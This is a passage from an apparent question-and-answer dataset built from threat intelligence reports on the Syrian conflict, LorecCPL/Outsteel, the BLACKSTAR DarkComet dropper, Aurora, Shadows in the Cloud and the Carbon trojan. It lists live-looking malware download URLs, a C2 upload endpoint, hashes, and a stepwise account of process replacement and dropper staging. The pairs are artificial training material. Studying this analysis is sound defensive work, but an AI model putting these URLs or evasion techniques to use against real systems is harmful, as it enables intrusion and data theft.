Groups\nPro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011. Those campaigns have been extensively reported on by a range of groups, including Kaspersky, FireEye, Citizen Lab, the Electronic Frontier Foundation, and many others. Regime-linked malware has a number of common features that typically serve as distinguishing characteristics:\nSocial engineering focusing on the needs and interests of the opposition. Although targeted, the malware seeding often aims at classes of people (e.g., people interested in 'shocking' news about a fighter, or 'leaked' information about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group.\nUse of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among others).\nAt least one command-and-control server located within Syrian IP space (often from a limited range of addresses).\nFrequent use of Dynamic DNS providers like no-ip.\nUse of \"crypters\" to obscure the binary.\nThese characteristics are not all present in every sample, but we have typically found one or more in almost every binary we have examined that is Syrian regime-linked.\nThis malware attack differs from known regime-linked groups in each of these elements. Not only is it exceptionally targeted, but it is also not a commonly available RAT. Nor does it have RAT functionality. The function of the malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each reboot. In addition, data is sent to an Internet e-mail address, and no crypter is used to obscure the binary.\nWe are aware of only (<https://www.eff.org/deeplinks/2012/04/new-wave-facebook-phishing-attacks-targets-syrian-activists>)one previous case in Syria in which e-mail was used to transmit data, and that we believed was regime linked. That incident, observed in 2012, also used hardcoded e-mail to exfiltrate. However, that malware had substantially more functionality than this case: not only did it drop a second stage from a compromised site, but was also included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype.\nThe lack of overlap in Tactics, Techniques, and Procedures (TTPs) between this attack and prior attacks does not rule out Syrian regime-linked attackers. It is possible that regime-linked groups are trying a new approach. However, given that known regime-linked groups continued to remain active during the same date range using familiar TTPs, this scenario seems unlikely. In addition, it would be strange for regime-linked malware groups to undertake significant effort to prepare and send an implant that has significantly less functionality than what they commonly use. Taken together, we find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack.\nMedium Headline: ISIS-linked Hackers\nRSS operates in territory controlled by ISIS, and has faced extensive targeting by ISIS. Currently, they appear to be directly targeted by ISIS for kidnappings and other retaliation, including executions. In addition, ISIS supporters have explicitly suggested that the group is under surveillance and actively hunted. Together this evidence suggests that ISIS has a strong motivation for using social engineering and/or malware to locate the members of RSS.\nMedium Headline: We think there are several features of the malware attack that align with the needs and constraints of ISIS and its supporters in Ar-Raqqah, more so than other groups, as we understand them. For example:\nThe malware beacons location but does not provide RAT functionality.\nThe seeding attempts to obtain a 'private' Facebook identity from RSS through social engineering.\nThe malware exfiltrates to an online e-mail account, thus not requiring the attacker to maintain a command-and-control server online.\nThe social media activity of members of RSS is often highly public. Their location and exact membership, however, is secret. We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they could have employed a RAT. However, if the attacker were interested in unmasking the location of its targets so they could be physically tracked down, collecting IP data and system info would be a more reasonable approach.\nISIS or its supporters clearly have a strong interest in the (rudimentary) location tracking of the members of RSS that this malware provides. Internet connectivity in Raqqah is extremely limited, and some of it is under ISIS control. Knowing the IP address of a target could quickly narrow down targets to specific locations, and specific Internet services, or Internet cafes in Raqqah. Given that the identities and locations of RSS members are closely guarded, such information would hold significant intelligence value for ISIS. Armed with this kind of information, ISIS could physically harm people within Raqqah (and it is also possible that they have the ability to operate in some capacity in border areas of Turkey).\nLittle is publicly known about the technical capabilities of ISIS and its supporters; however, reports have begun to emerge suggesting that ISIS is interested in expanding its abilities. In addition, ISIS has reportedly gained the support of at least one individual with some experience with social engineering and hacking: Junaid Hussain (aka TriCk), a former member of teamp0ison hacking team. While Mr. Hussain and associates have reportedly made threats against Western governments, it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted organization, which is a highly visible thorn in the side of ISIS.\nMedium Headline: Other Unknown Actors\nIt is possible that the attack is the product of actors working for unknown purposes and targeting RSS. Given the activities of RSS, however, it is unclear who this might be. It is not possible, for example, to reject the theory that some unknown group within the FSA, or other groups opposing the Assad regime are responsible. Citizen journalists in Ar-Raqqah were previously critical of arbitrary arrests carried out by non-ISIS groups in 2013. However, it is unclear why those groups, which no longer control Ar-Raqqah, would be interested in RSS in November 2014.\nIt is likely that third party actors, including several intelligence services, are closely monitoring various actors in the conflict through a range of electronic means. However, there is little reason to suggest that they would use a tailored but technically rudimentary attack to target RSS in particular.\nRead the text above and answer this question: How does the lack of overlap in Tactics, Techniques, and Procedures (TTPs) between this attack and prior regime-linked attacks influence the attribution of the malware to different threat actors?",
    "output": "The lack of overlap in TTPs between this attack and prior regime-linked attacks suggests that familiar regime-linked groups did not conduct the attack. While it is possible that regime-linked groups are trying a new approach, this scenario seems unlikely given that known regime-linked groups continued to use familiar TTPs during the same period. The significant effort to prepare and send an implant with less functionality than commonly used also points away from regime-linked groups. This evidence supports the hypothesis that other actors, possibly ISIS or its supporters, conducted the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.2 BABADEDA Crypter Dropped from a new Downloader\nThe second infection chain analysed begins with an archive containing a file with the extension \".cpl\" that subsequently downloads the BabaDeda crypter. Based on the compilation date of the cpl file, it is assumed that this campaign can be traced back to November 2021.\nexecution process graph\nIn terms of analysis, looking at a CPL file is essentially identical to a DLL file. However, unlike the latter, it is automatically run when double-clicked. This makes it similar to EXE files; however uneducated users may be more likely to try to execute CPL files if they do not know any better. These files with the extension CPL have code overlaid with LorecCPL described by the security company NSFocus.\nThe zip archive, with hash 33ddc1b13c079001eaa3514de7354019fa4d470a, was hosted on discord and contains the LorecCPL file with hash:\n3bbe45cdcc2731c0bb4751d1098eccc50f98ef66.\nThe latter is named:\n\"PDF \u2013 \u0406\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0456\u044f \u043e\u0442\u0440\u0438\u043c\u0430\u043d\u043d\u044f \u0431\u043e\u043d\u0443\u0441\u0443 \u0437\u0430 \u0432\u0430\u043a\u0446\u0438\u043d\u0430\u0446\u0456\u044e______________________-pdf.cpl\" which means \"PDF \u2013 Instructions for receiving the vaccination bonus ________________________- pdf.cpl\"\nThe LorecCPL file downloads an MSI file and installs it in the path: \"C:\\Users\\admin\\AppData\\Roaming\\3delite\\Memory Test Toolkit\".\nThe LorecCPL file is therefore only a downloader and has a structure similar to a shellcode as shown in the following figure:\nBasically, the code and the useful data are both in the text section. The return address in the stack is used to insert the address of the value that will be used by the call. The following routine is used to find the module addresses , walking the PEB structure:\nOnce the address of the library has been obtained, of course the necessary APIs will actually be resolved:\nThe function to find the library address and to resolve the API name are used few times to get the address of the APIs LoadLibraryW() and GetProcAddr(), respectively the addresses are stored in the EDI and ESI registers. So further in the code when a library or a API should be resolved the EDI/ESI register are used to call the proper API.\nThe library downloads an executable, with hash\n\"7b67ed1f42e5cf388a0a981566598E716D9B4F99\" from the URL\n\"CDN.Discordapp.com/attachments/908281957039869965/911202801695/9112028016965 /91120280162882172/adobeaacrobatreaderUpdate.exe\" using the \"WinHTTP\" library, saves it in the path: \"C:\\Users\\Public\\svchosts.exe\" and finally executes it.\nThe file with hash 7b67ed1f42e5cf388a0a981566598e716d9b4f99 install BabaDeda crypter and starts the main malicious binary named also in this case mathparser.exe.\nThe malicious files extracted are always the same:\nThe LorecCPL libraries have been used to download Outsteel or BabaDeda crypter.\nMedium Headline: 2.3 LorecCPL downloads ASPProtected Outsteel\nThis infection chain according to the compilation time is of December 2021, differently from the previous one it does not uses BabaDeda crypter as loader but just uses LorecCPL to download Outsteel packed.\nThe chain starts with an archive, with hash 0d94bac4c4df1fe3ad9fd5d6171c7460b30d8203, containing a LorecCPL file, with hash f9d5b4cd52b42858917a4e1a1a60763c039f8930, and named\npdf - \u041f\u0440\u0438\u043a\u043b\u0430\u0434 \u0437\u0430\u043f\u043e\u0432\u043d\u0435\u043d\u043d\u044f \u043f\u043e\u044f\u0441\u043d\u044e\u0432\u0430\u043b\u044c\u043d\u043e\u0457 \u0442\u0435\u043a\u0441\u0442 \u0437\u0430\u043f\u043e\u0432\u043d\u044e\u0454\u0442\u044c\u0441\u044f \u0432\u0440\u0443\u0447\u043d\u0443.cpl .\nThe CPL file, having the text segment writable, decrypts the real code via xor and then jump on it. After the xor operation the code goes on the decrypted zone and execute the usual LorecCPL flow, i.e. putting arguments on the stack as return address and use them in functions.\nIndeed dumping the process the visual of the code is equals to the previous one.\nThe LorecCPL will download from \"stun.site/zepok101.exe\" the Outsteel infostealer, with hash dbc9c8a492ae270bb7ed845680b81b94483ab585, packaged with the ASProtect tool .\nAfter decompressing and unpacking it, the \"Outsteel\" infostealer was found to exfiltrate documents on C2: \"hxxp://185.244.41.109:8080/upld/\"\nBelonging to the same campaign, for the same infection chain and period there is another archive, with hash 66117493eed35fbd3824e35971b0919190cd1de7, hosted at the following URL:\n\"hxxp://flexspace.app/images/%D0%A2%D0%9B%D0%A4%20%D0%B8%D0%BD%D1%8 4%D0%BE%D1%80%D0%BC%20%D0%92%D0%A0%D0%A3.docx.rar\".\nThis RAR file containing the usual LorecCPL file inside, with hash d0f1518db54f280dde5008404a2750641e76ceb2, named \"\u0422\u041b\u0424 \u0438\u043d\u0444\u043e\u0440\u043c \u0412\u0420\u0423.docx.cpl\".\nThe LorecCPL file, just like the previous one, starts decrypting its payload and then acts like the previous downloading the Outsteel ASPRotected.\nLorecCPL file before decryption:\nLorecCPL file after decryption:\nThe LorecCPL will download the next stage Outsteel from the following URL: \"hxxp://stun.site/42348728347829.exe\".\nThe next stage, with hash 942337f3ea28f553b47dc05726bb062befe09fef, is still packed with ASProtector. The exfiltrated documents are still sent to the same IP address: 185.244.41.109.\nBig Headline: 4 ATT&CK Matrix\nTelsy is the Digital Champion of TIM Group for cybersecurity and cryptography. For 50 years it has been at the service of the defense of the country, supporting armed forces and institutions in the defense of communications and the Italian cyber perimeter. Working in synergy with the other factories of the TIM Group, Telsy is the Cybersecurity competence center, which develops, besides the innovative core business focused on communication security, firmware security, MSS, data center security, and decision intelligence & data analytics solutions.\nTelsy complies with the Golden Power regulation, being a strategic company to the national security and defense.\nThis report was produced by Telsy's \"Cyber Threat Intelligence\" team with the help of its CTI platform, which allows to analyze and stay updated on adversaries and threats that could impact customers' business.\n\u00a92022 Telsy. All rights reserved. The reproduction and distribution of this material is prohibited without express written permission from Telsy.\nTELSY S.p.A.\nCorso Svizzera, 185 - 10149 Torino \u2013 ITALIA www.telsy.com email: telsy@telsy.it\n\nQ: How does the LorecCPL downloader operate to download and execute the Outsteel infostealer, and what security measures are used to protect the payload?",
    "output": "A: The LorecCPL downloader operates by decrypting its payload using XOR encryption and then executing the decrypted code. This code follows the typical LorecCPL flow, placing arguments on the stack as return addresses and using them in functions. The downloader retrieves the Outsteel infostealer from a specified URL, which is packed with the ASProtect tool to obfuscate its contents. Once downloaded, the Outsteel infostealer exfiltrates documents to a command and control (C2) server. The use of encryption and packing tools like ASProtect adds layers of security to the payload, making it harder for security analysts to detect and analyze.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: SPECIAL ASSIGNMENT\nIn this redacted, translated, and excerpted conversation the leader of an opposition fighting group is offered a fighting job: launch an attack on a particular airport. The emphasis on communications discipline, and the need for documentation are both notable.  The need for photographic proof suggests a need for verification by a distant party, perhaps the \"funder\" who is said to be in Saudi Arabia. Perhaps photographic proof is also important for a group (or funder's) reputation and being able to claim credit for a particular attack.\nPERSON 2\nIn full form, this conversation reveals several pieces of sensitive military information regarding the opposition's approach to launching, funding, and operationalizing an attack plan. The potential real-time surveillance of opposition wartime discussions could provide the Assad regime with valuable intelligence about ongoing or planned military campaigns, identification of who funds the opposition, and how the operational financial infrastructure works.\nVery Small Headline: BLACKSTAR, A CUSTOM DROPPER FOR THE DARKCOMET RAT\nDarkComet is a widely available, stable, and easy to use remote administration tool (RAT) that allows a threat actor to control a compromised system. In addition to standard backdoor functions such as manipulating processes, services, the registry, and uploading and downloading files, DarkComet can also activate the webcam and microphone. Since DarkComet is so well known, security products such as antivirus software can often detect it.\nThis threat group uses a custom dropper which we call BLACKSTAR. BLACKSTAR contains an embedded, obfuscated binary which is a second dropper and launcher that we call REDDWARF. REDDWARF contains the actual DarkComet payload. BLACKSTAR writes REDDWARF to disk for persistence, but DarkComet itself is only ever extracted to memory by REDDWARF. Many antivirus vendors fail to detect this DarkComet backdoor because it is obfuscated inside the BLACKSTAR binary or because it is loaded into memory using process replacement.\nBLACKSTAR malware performs the following actions:\n1. The BLACKSTAR binary (in this case, adobereadersetup-86x.exe, 39632325327bf21f7d9cf02caf065646) is first extracted from two nested SFXRAR archives, as described above.\n2. BLACKSTAR contains two resources:15\n\u2022 QUYFKY\\DIOKAK contains a decoder key for the configuration data and the embedded PE (REDDWARF).\n\u2022 QUYFKY\\UXLNYL contains the encoded configuration data which consists of function names that the malware resolves dynamically, as well as offsets used to extract the embedded PE.\n3. REDDWARF is actually contained within a Word document embedded within the BLACKSTAR binary. BLACKSTAR first finds the offset of the embedded Word file, then decodes the configuration data that includes the offset of the REDDWARF binary within the Word file.16 The embedded key is used to decode the embedded REDDWARF binary (8af83d74033aded17af538e4ccf12092). REDDWARF is loaded in to memory and executed, replacing the BLACKSTAR process in memory through a technique known as process replacement.17\n15 The resource names vary across samples, and appear to consist of six random upper-case letters.\n16 The Word document is never written to disk, and may simply be intended to further mask the REDDWARF binary.\n17 Process replacement replaces a legitimate binary in memory with a malicious one. First, a legitimate binary is launched in a suspended state. The content of the legitimate binary is then unmapped from memory, memory is allocated at the original binary's location, and the content of the malicious file is written to that memory space. The main suspended thread is pointed to the memory location of the malicious code, and the thread is resumed, executing the malware. By using process replacement the malicious code will appear to be the legitimate process to many analysis tools.\n4. REDDWARF contains two resources:\n\u2022 RT_RCDATA\\1 which contains the DarkComet binary (24f1658f3f38245dc15b9619bc97979b);\n\u2022 RT_RCDATA\\2 which contains plaintext configuration data. Similar to BLACKSTAR, the REDDWARF configuration data consists of function names that the malware resolves dynamically; the registry location that the malware should use for persistence; and (optionally) a file name that contains a script.\n5. REDDWARF extracts the DarkComet backdoor and spawns a copy of itself. It uses process replacement on that copy to launch the DarkComet backdoor in memory. Finally REDDWARF copies itself to disk, maintaining persistence via the registry entry specified in its configuration file (e.g., HKCU\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\1).\nWe suspect that the malware authors used an automated tool to embed the DarkComet payload within the second binary and\nwithin the BLACKSTAR dropper. Interestingly, we observed at least one case where the payload may have been run through the packaging tool twice; that is, the BLACKSTAR dropper contained an embedded REDDWARF binary, which contained another BLACKSTAR dropper, which contained another REDDWARF binary, which contained the final DarkComet payload:\n\u2022 BLACKSTAR binary(itselfcontained within multipleSFXRAR files): GoogleUpdate.exe,7247d42b3b4632dc7ed9d8559596fff8.\n\u2022 Embedded REDDWARF binary: 1b20ea5887775f8eddf5aecd5d220154\n\u2022 Embedded BLACKSTAR binary: 97a35a7471e0951ee4ed8581d2941601\n\u2022 Embedded REDDWARF binary: dd08f85686bd48e4bab310d8fbff81a4\n\u2022 Embedded DarkComet payload:\nae1ea30e6fb834599a8fed11a9b00314\nThat particular BLACKSTAR dropper (7247d42b3b4632dc7ed9d8559596fff8) was dropped by at least four different original \"lure\" files.\nAnswer this question: Describe the role of REDDWARF in the BLACKSTAR malware delivery chain and how it contributes to the overall effectiveness of the attack.",
    "output": "REDDWARF plays a crucial role in the BLACKSTAR malware delivery chain. It is embedded within the BLACKSTAR binary and is responsible for extracting and launching the DarkComet backdoor. REDDWARF is loaded into memory and executed using process replacement, ensuring that it appears as a legitimate process. It then extracts the DarkComet binary, spawns a copy of itself, and uses process replacement again to launch DarkComet in memory. Finally, REDDWARF copies itself to disk for persistence via a registry entry. This multi-stage process increases the complexity of the attack, making it more difficult for security solutions to detect and mitigate the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Malware Summary of Findings and Analysis\nThe predecessor Aurora malware comes from two different families. The newer family came immediately 2 months after the older family, and there was no overlap in their prevalence. For the older family, there was neither an observable protection mechanism nor an AV evasion technique. It was simply a dropper for keylogger files. The newer family has some protection mechanisms and AV evasion techniques. However, it lacks the sophistication found in other botnet malware families.\nBelow is a summary of the findings of the two malware families that were analyzed.\nCommon characteristics:\n1. Served through fake AV hosting Web sites (no longer available)\n2. Common autostart techniques\n3. Common older stealth techniques\n4. Multiple malware server domains to improve resiliency\n5. Droppers and dropped files (EXE and DLLs) were compiled using Microsoft compilers\nDifferences:\n1. Main malware component:\na. November 2009 Family \u2013 uses DLL file as one of its components\nb. August 2009 Family \u2013 uses VXD and SYS files\n2. Main function:\na. November 2009 Family \u2013 pop-up ads\nb. August 2009 Family \u2013 Suspected keylogger (actual files are no longer available for analysis)\n3. Protection Mechanism:\na. November 2009 Family \u2013 uses basic protection mechanisms to hide itself\nb. August 2009 Family \u2013 none observed\nComparing them to Trojan.Hydraq:\n1. Code obfuscation\n\u2022 Trojan.Hydraq uses \"spaghetti code\" in which program elements are separated into small chunks and connected via jump instructions. This technique complicates following the code, and is similar to the tactics employed in old PE viruses that write to small spaces in the host and connect themselves through jump instructions.\n\u2022 November 2009 Family \u2013 Does not use any code obfuscation. One dropped file is actually packed using FSG v1.33.\n\u2022 August 2009 Family \u2013 None observed.\n2. Autostart Technique\n\u2022 Trojan.Hydraq uses Svchost process in Windows by adding its service name in \"netsvcs\". When Windows starts, it will load the service into memory.\n\u2022 November 2009 Family \u2013 Uses common autostart technique using the \"Run\"key.\n\u2022 August 2009 Family \u2013 Uses common autostart technique using the \"Run\" key.\n3. Intent / Payload\n\u2022 Trojan.Hydraq \u2013 Information gathering\n\u2022 November 2009 Family \u2013 Pops up ads and Web site redirector\n\u2022 August 2009 Family \u2013 Information gathering\nMedium Headline: Malware Significance\nBasing on the profile of the two malware families that were analyzed, they are obviously different from each other. The key thing they have in common is that the CnC they utilize are publicly associated with the Aurora botnet.\nThe botnet controllers preyed on the fear of users that their system is infected with malware. This method saves the botnet controllers from the technical complexity of bypassing Windows' UAC by using the weakest link in host security \u2013 which is the user. The misled user typically clicks OK to everything, bypassing UAC and giving the malware dropper explicit permission to execute.\nNeither of the malware predecessor families exhibit the sophistication found in newer malware. Some of the evasion techniques are almost a decade old. Both families use two sets of domains: one for serving malware and the other for CnC.\nThe droppers and dropped files were compiled using Microsoft Compilers. This is evidenced by the presence of the string \"Rich\" before the PE header. This watermark is undocumented, meaning there is no mention of this watermark from Microsoft references but they are present in binaries compiled using Microsoft Compilers. Knowing the compiler of choice might help investigators narrow down the individuals or group of individuals responsible for the code.\nThe simplicity and relative obsolescence of the early versions of the Aurora malware suggest that these malware families were created or written by an individual or group of individuals new to the production of commercial grade malware. Based solely on these families of malwares, it also appears that different individuals or group of individuals created the code:\n\u2022 The only association the different families have with each other is that they used CnCs associated with Operation Aurora, and they were distributed via similar means. That said, it is possible that two different groups purchased the services of the same crimeware group (probably the same people behind Operation Aurora) to distribute and manage their malware family. Or the crimeware group rented out different variants of the same malware to different groups with different intentions. Price may also be a factor. The less resilient the malware family is, the cheaper it is to purchase or rent.\n\u2022 The intent of each malware family is different.\n\u2022 There is no natural progression seen between the two families. Usually malware writers evolve in both technology and protection of their creation but these two families did not show any related evolution. The malware families appear to exist independently, and then become superseded by Trojan.Hydraq.\nBig Headline: Piecing it Together\nDamballa analyzed network DNS information from a number of distinct and complementary sources ranging from global monitoring systems, enterprise monitoring sensors, passive DNS resolution data\nand other DNS streams for this report. At the same time, Damballa also analyzed the malware commonly associated with the Aurora attacks disclosed by Google in January. The result has been a definite correlation between key CnC channels with other malware families that are associated with the criminal operators behind the Aurora botnet.\nBased upon our analysis of this attack and the surrounding evidence currently available, we classify the attacks against Google and the other previously identified victim organizations as being typical of current botnet criminal practices. The attack is most notable not for its advanced use of an Internet Explorer 6 Zero-Day exploit, but rather for its unsophisticated design and a pedigree that points to a fast-learning but nevertheless amateur criminal botnet team.\nMedium Headline: DDNS Findings Summary\nBased upon Damballas investigation of DDNS data, the key findings are as follows:\n1. The botnet has a simple command topology and makes extensive use of DDNS CnC techniques. The construction of the botnet would be classed as \"old-school\", and is rarely used by professional botnet criminal operators any more. However, such reliance upon DDNS CnC is commonly associated with new and amateur botnet operators\n2. There were several CnC domains were identified based upon key characteristics of the registration and management of the previously publicly disclosed CnC domains.\n3. The major pattern of attacks in mid-December appear to have their origin in July 2009 in mainland China. This likely corresponds to early testing of the botnet CnC.\n4. Some of the infections appeared to start within Google's network. Some of apparent botnet the traffic is not consistent with an IE6/WinXP infection and cannot be easily explained.\n5. The attackers had access to large numbers of CnC hosts in geographically diverse hosting co-locations \u2013 certainly a high number for a botnet. Further, the botnet used over a dozen domains in diverse DDNS networks for CnC.\n6. Only the US victims were compelled to perform MX queries, an event that would typically indicate attempted document exfiltration via email services.\n7. Some of the botnets focused on victims outside of Google, suggesting that each domain might have been dedicated to a distinct class or vertical of victims.\n8. A review of the TTL period suggests that botmasters de-registered their domains around December 18, 2009.\nMedium Headline: Passive DNS Data Summary\nBased upon analysis of DNS resolution data gathered through a global network of passive DNS monitoring sensors, the key findings are as follows:\n1. Cumulative volume of CnC domain name resolutions provides adequate sampling to identify the initialization and growth phases of the Aurora botnet, which also reveals active operation of the CnC channels dating back to June 14th 2009.\n2. The victim's computers connected to, or were part of, 64 different networks, based upon Autonomous Systems (AS) breakdown of Internet netblocks which could represent the upper bound of organizations that may have been breached in the larger Aurora attack. Some organizations (such as Google) own and manage several AS networks. Some of the other AS networks were associated with public Internet Service Providers, which may encompass multiple small and medium businesses.\n3. The various CnC domains used by the criminal botnet operators peaked at different times with different rates of lookup by victim systems. These observations correspond to different campaigns run in parallel by different botnet operators and represent the widely publicized attacks that appeared to make use of the Internet Explorer 6 Zero-Day exploit. It is a common tactic by botnet operators to run multiple campaigns at the same time, using different infection vectors (e.g. drive-by downloads, FakeAV, USB infections, etc.) over extended periods of time. This strategy is very consistent with APT campaign methodologies.\n4. The vast majority of victim systems appear to have been based in the United States.\n5. It is possible to identify the various CnC testing, deployment, management and shutdown phases of the Aurora botnet CnC channels. Some of the CnC domains appear to have been dormant for a period of time after they had infected number victim systems. This type of activity can sometimes be associated with an update to the botnet malware or if the criminal operator sells/trades a segment of the botnet to another criminal operator.\nAnswer this question: What insights can be gained from the analysis of passive DNS data regarding the Aurora botnet's operations and victim distribution? How does this align with APT campaign methodologies?",
    "output": "The analysis of passive DNS data revealed several key insights about the Aurora botnet's operations and victim distribution. The cumulative volume of CnC domain name resolutions showed the initialization and growth phases of the botnet, with active operation dating back to June 14th, 2009. Victims were connected to 64 different networks, with the majority based in the United States. Different CnC domains peaked at different times, corresponding to parallel campaigns run by different botnet operators. This strategy aligns with APT campaign methodologies, where multiple infection vectors are used over extended periods to maximize impact and evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PART 3: Mapping the Shadows in the Cloud\nIn order for us to begin to map the Shadows in the Cloud, it was important for us to have clear starting points. The first and easiest starting point that we identified was to look back at what was related to and still operational from the previous Tracking GhostNet report. We focused primarily on the domains described in GhostNet and set out to see what we could learn from them in their current state. The second was to continue collecting and analyzing information on attacks gleaned from field research and reports that were shared with us by third-parties. Each of these starting points branched off from one another and crossed paths in various ways, revealing at least two distinct cyber espionage networks.\nWe previously mentioned that a large portion of the domain names mentioned in Tracking GhostNet went offline following the initial report. As a result, several of the domain names described in it were abandoned. The domains ultimately expired and were available for re-registration. This gave us the opportunity to take over these domains and monitor any connections that might come to them. Doing this allowed us to see connections from victims that were still infected, and learn more about how the command and control server was configured. The Shadowserver Foundation has utilized this technique for a long time (Higgins 2008).\nThe investigation was broadened further when field research by the Information Warfare Monitor crossed paths with research being done by the Shadowserver Foundation. The field research revealed that a computer system in the OHHDL had been compromised by at least two different types of malware associated with targeted malware intrusions. Based on our understanding of the malware, the domains and on-going research, we assess that this compromise also involved at least two different cyber espionage groups and potentially even a third one. Analysis of several malware components and their associated command and control servers ultimately led to the discovery of an accessible drop zone for documents being siphoned off compromised systems.\nThe attackers' command and control infrastructure is a critical component of maintaining persistent access to compromised computers. Through this infrastructure, the attackers issue commands to the compromised machines as well as exfiltrate data to drop zones or to the command and control servers themselves. By carefully examining the relationships between command and control servers we were able to map out the extent of one such network and link it with other similar malware networks.\nThis report focuses on only one of these networks, one that we have named the Shadow network. This is a complex network that leveraged social networking websites, webmail providers, free hosting providers and services from some of the largest companies on the Internet as disposable command and control locations. The first layer of control used blogs, newsgroups, and social networking services to maintain persistent control as these system are unlikely to be detected as malicious. As compromised computers accessed these services, they received another command and control location, often located on free web hosting providers. The command and control servers on the free hosting services are often disabled over time \u2013 most likely due to reports of malicious activity. When the command and control servers on free web hosting services were disabled, the compromised systems would receive commands from the social networking layer and then beacon (i.e., attempt a connection) to a more stable inner core of dedicated systems located in the PRC. Unlike the command and control servers on free web hosting services, these dedicated servers hosted in the PRC have proven to be quite stable over time.\nMedium Headline: 3.1 Analysis of Data while in the Field\nDuring the field investigation we collected samples of network traffic from computers at the OHHDL and other Tibetan-related locations. Inspection of network traffic from these computers revealed that at least three of them were compromised and were communicating with the same set of command and control servers. The traffic analysis revealed that these systems were all connecting to the domain jdusnemsaz.com. At the time it resolved to the IP address 119.84.4.43, which is assigned to China Telecom in the province of Chongqing, PRC. The commands sent by the command and control server were identical to malware we found at the Tibetan NGO Drewla and the OHHDL during our GhostNet investigation a year earlier, although were not part of the network that was described in that initial report.\nThere is a similarity between the commands sent by the command and control server jdusnemsaz.com and a previously identified control server, lookbytheway.net. In both cases, the network traffic captured from the compromised computers revealed that the malware was exfiltrating sensitive documents.\nTable 1: Command and Control: Similarities with previous attacks\nFurther analysis of the network traffic also revealed that at least one of the systems was infected with additional malware not associated with the aforementioned command and control servers.  The system was attempting DNS resolutions of multiple hostnames. Two of the hostnames resolved to IP addresses but were not available when the system attempted to communicate to them. The other hostname did not resolve at all.\nThe failed DNS resolution was for www.assam2008.net, which is a domain that has been used by a different group of attackers in the past in conjunction with the Enfal trojan, and suggests a limited connection between the current malware under investigation and malware used in previous attacks on other targets. This domain name was available for registration and was added to our ongoing sinkhole project.\nWhile recording network traffic in the field, we observed the attackers removing two senstive documents from the OHHDL (see fig. 1, page 15). The data was compressed using CAB, split into 100kb chunks when necessary, encoded with base64, and then uploaded to a command and control server. In this case, data was being uploaded to c2etejs.com, which is hosted on the same IP address (119.84.4.43) as jdusnemsaz.com.\nWe reconstructed the documents that were exfiltrated from the OHHDL: \"letters - current.doc\" and \"letters - master 2009.doc (see fig. 2, page 15).\" The documents contained over 1,500 letters sent from the Dalai Lama's office between January and November 2009. While many of the letters are perfunctory \u2014 responses to various invitations and interview requests \u2014 they allow the attackers to collect information on anyone contacting the Dalai Lama's office. Moreover, there are some communications contained within these documents that could be considered sensitive, such as communications between the OHHDL and Offices of Tibet around the world. Some communications contain generic information of the Dalai Lama's travelling details including schedule of appearances \u2013 but very little that could not be established through open sources and publicly available information on the internet.\nMedium Headline: 3.2 Technical Investigation\nDuring the technical investigation we examined the data collected from the field, third-party sources, and from our DNS sinkhole project in order to determine the attack vectors used to exploit and compromise the victims. While we were unable to determine how any one individual computer came to be compromised, we documented a variety of exploits used by the attackers. We mapped out the broader command and control infrastructure by discovering new pieces of malware located on servers that we identified, and catalogued any new servers that these instances of malware were configured with. We also looked at domains that were co-hosted on the same servers we had already identified, and used searches to identify Twitter, Google Groups, Blogspot, Baidu Blogs, blog.com, and Yahoo! Mail accounts that were misused by the attackers to update compromised computers with new command and control locations. We also discovered a panel or listing of compromised computers. During our investigation into one of the servers we made a significant discovery: we were able to recover data that was being exfiltrated by the attackers from compromised computers. These documents were only available on the command and control server for a short time after being uploaded by the compromised systems, as the attackers frequently removed them at irregular time intervals.\nQ: During the field investigation, what specific malware behaviors were observed on the compromised systems at the OHHDL? How did the researchers analyze the network traffic to identify these behaviors?",
    "output": "During the field investigation, researchers collected samples of network traffic from computers at the OHHDL and other Tibetan-related locations. They observed that at least three of these systems were compromised and communicating with the same set of command and control servers, specifically the domain jdusnemsaz.com, which resolved to an IP address assigned to China Telecom in Chongqing, PRC. The commands sent by the command and control server were identical to malware found during the GhostNet investigation a year earlier. The network traffic analysis revealed that the malware was exfiltrating sensitive documents. Additionally, one of the systems was infected with additional malware not associated with the aforementioned command and control servers, attempting DNS resolutions of multiple hostnames, some of which resolved to IP addresses but were not available when the system tried to communicate with them.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Gaining Final Persistence\nBy adding a second stage malware to an infected system, final persistence is gained:\n\u2022 They usually run under administrator privileges and require a privilege escalation.\n\u2022 They are started in more complex ways at boot up time, typically using a service, or -in the case of rootkits -kernel drivers.\n\u2022 They also allow the execution of batch scripts and binaries in their tasks, but often also support plugins like key loggers and activities like taking screenshots.\n\u2022 They are usually multi-threaded. Received tasks are not immediately executed, but queued and later on executed via another thread, usually even running in a different process.\n\u2022 They use named pipes and mutexes to coordinate the different threads.\n\u2022 They do have a separate configuration file that allows incremental updates\n\u2022 They always install a unique trojan ID for every infected system\n\u2022 They support peer-to-peer functionality: tasks can be forwarded to other bots for execution.\nThis peer-to-peer functionality is a very important additional feature of the stage 2 malware. This means that a bot is able to receive a task from it's C&C server(s) and route it to another infected bot in the local network; results are sent back using the same path in the reverse direction. To facilitate this feature, every infected bot gets a unique trojan ID at infection time, and every task contains initial routing information, potentially even using several intermediate hops, but we never actually observed tasks with more than two hops. The peer-to-peer network uses different methods for communication, very common are named pipes, but also direct TCP connections are possible. These relations are shown in the following illustration:\nThe first actual stage 2 trojan appeared around the same time as the corresponding recon tool, though we only discovered it some time later. The programmers called it Carbon in the configuration file, so we also use this name; another name for it, derived from a PDB string, is Cobra (a type of snake, but this is not the Snake rootkit). It came as a rootkit and 